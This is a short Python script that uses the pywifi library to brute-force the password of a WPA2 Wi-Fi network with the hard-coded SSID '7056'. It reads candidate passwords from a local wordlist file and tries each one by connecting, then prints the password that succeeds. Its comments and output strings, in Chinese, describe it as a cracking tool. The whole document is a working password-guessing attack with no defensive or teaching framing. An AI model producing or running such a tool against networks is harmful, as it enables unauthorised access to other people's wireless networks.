import time  
import pywifi
from pywifi import const 
from asyncio.tasks import sleep
 
 
class PoJie():
    def __init__(self, path):
        self.file = open(path, "r", errors="ignore")
        wifi = pywifi.PyWiFi()  # 抓取网卡接口
        self.iface = wifi.interfaces()[0]  # 抓取第一个无限网卡
        self.iface.disconnect()  # 测试链接断开所有链接

        assert self.iface.status() in [const.IFACE_DISCONNECTED, const.IFACE_INACTIVE]  # 测试网卡是否属于断开状态
 
    def readPassWord(self):
        print("開始破解：")
        while True:
            try:
                myStr = self.file.readline()
                if not myStr:
                    break
                bool1 = self.test_connect(myStr)
                if bool1:
                    print("密碼正確：", myStr)
                    break
                else:
                    print("密碼錯誤:" + myStr)
                
            except:
                continue
 
    def test_connect(self, findStr):  # 测试链接
        profile = pywifi.Profile()  # 创建wifi链接文件
        
        profile.ssid = "7056"  # wifi名称
        
        profile.auth = const.AUTH_ALG_OPEN  # 网卡的开放，
        profile.akm.append(const.AKM_TYPE_WPA2PSK)  # wifi加密算法
        profile.cipher = const.CIPHER_TYPE_CCMP  # 加密单元
        profile.key = findStr  # 密码
        self.iface.remove_all_network_profiles()  # 删除所有的wifi文件
        tmp_profile = self.iface.add_network_profile(profile)  # 设定新的链接文件
        self.iface.connect(tmp_profile)  # 链接
        time.sleep(1)
        if self.iface.status() == const.IFACE_CONNECTED:  # 判断是否连接上
            isOK = True
        else:
            isOK = False
        self.iface.disconnect()  # 断开
        time.sleep(1)
        # 检查断开状态
        assert self.iface.status() in [const.IFACE_DISCONNECTED, const.IFACE_INACTIVE]
        return isOK
 
    def __del__(self):
        self.file.close()
 

path = r"C:\Users\user\Desktop\python程式\破解wifi密碼\wifipass\wifipass_split_2/wifipass_1.txt"
start = PoJie(path)
start.readPassWord()
